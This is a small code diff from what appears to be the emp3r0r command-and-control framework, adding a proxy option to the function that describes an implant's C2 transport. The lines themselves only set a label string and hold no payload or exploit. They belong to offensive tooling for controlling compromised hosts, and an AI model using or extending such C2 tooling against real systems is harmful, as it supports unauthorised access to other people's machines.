@@ -284,6 +284,10 @@ func setC2Transport() {
 			emp3r0r_data.Transport = fmt.Sprintf("Shadowsocks (*:%s) in KCP (*:%s) to %s",
 				RuntimeConfig.ShadowsocksServerPort, RuntimeConfig.KCPPort, emp3r0r_data.CCAddress)
 		}
+		return
+	} else if RuntimeConfig.C2TransportProxy != "" {
+		emp3r0r_data.Transport = fmt.Sprintf("Proxy %s", RuntimeConfig.C2TransportProxy)
+		return
 	} else {
 		emp3r0r_data.Transport = fmt.Sprintf("HTTP2 (%s)", emp3r0r_data.CCAddress)
 	}
